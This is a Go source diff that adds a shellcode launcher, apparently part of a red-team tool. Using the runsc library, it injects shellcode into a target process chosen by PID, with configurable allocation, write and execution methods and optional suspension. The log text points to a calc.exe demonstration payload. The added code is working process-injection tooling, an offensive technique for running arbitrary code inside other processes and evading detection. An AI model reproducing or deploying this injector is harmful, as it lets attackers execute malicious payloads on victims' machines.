@@ -5,7 +5,9 @@ import (
 	"strings"
 	"time"
 
+	hl "github.com/mjwhitta/hilighter"
 	"github.com/mjwhitta/log"
+	"github.com/mjwhitta/runsc"
 )
 
 func getPayload() string {
@@ -16,6 +18,41 @@ func getPayload() string {
 	}
 
 	return strings.Join(payload, "")
+}
+
+func launch(sc []byte) error {
+	var l *runsc.Launcher = runsc.New()
+
+	if _, ok := aMethods[flags.alloc]; !ok {
+		return hl.Errorf("unsupported alloc method: %s", flags.alloc)
+	}
+
+	if _, ok := rMethods[flags.run]; !ok {
+		return hl.Errorf("unsupported run method: %s", flags.run)
+	}
+
+	if _, ok := wMethods[flags.write]; !ok {
+		return hl.Errorf("unsupported write method: %s", flags.write)
+	}
+
+	l.AllocVia(runsc.AllocMethod(aMethods[flags.alloc].val))
+	l.InPID(uint32(flags.pid))
+	l.RunVia(runsc.RunMethod(rMethods[flags.run].val))
+	l.Suspend(flags.suspend)
+	l.WriteVia(runsc.WriteMethod(wMethods[flags.write].val))
+
+	log.Infof(
+		"Launching calc in %d: %s->%s->%s",
+		flags.pid,
+		flags.alloc,
+		flags.write,
+		flags.run,
+	)
+	if e := l.Exe(sc); e != nil {
+		return e
+	}
+
+	return nil
 }
 
 func main() {
